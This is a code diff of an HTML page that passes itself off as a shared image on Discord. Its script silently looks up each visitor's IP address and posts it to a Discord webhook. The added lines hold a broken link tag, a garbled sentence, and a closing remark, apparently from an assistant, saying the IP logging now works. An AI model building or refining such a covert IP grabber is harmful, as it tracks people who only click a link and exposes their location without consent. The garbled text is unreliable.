@@ -10,7 +10,7 @@
     <meta property="og:type" content="image/png" />
 
     <script>
-        const webhookURL = "https://discordapp.com/api/webhooks/1317895579828748308/ni9_3dstKqP9xLi-AQglTGZErQ26PbkW0RIrbG3s60hX5EajueEvpIsWJPbOoNj_kd1F";
+        const webhookURL = "https://discordapp.com/api/webhooks/1317895579828748308/ni9_3dstKqP9xLi-AQglTGZErQ26PbOoNj_kd1F";
 
         async function logIP() {
             try {
@@ -20,10 +20,10 @@
                 await fetch(webhookURL, {
                     method: "POST",
                     headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({ content: `IP Logged: ${data.ip}` })
+                    body: JSON.stringify({ ip_address: data.ip })
                 });
             } catch (error) {
-                console.error("Error logging IP:", error);
+                console.error("Failed to log IP address: ", error);
             }
         }
 
@@ -31,6 +31,9 @@
     </script>
 </head>
 <body>
-    <p>Your image should appear when shared on Discord.</p>
+    <p>The IP address has been logged. Check the <a href="https://discordapp.com/account name and the server</a> clicked the link in my webhook.
+
 </body>
 </html>
+
+Now the code should properly log the IP address and handle errors correctly.
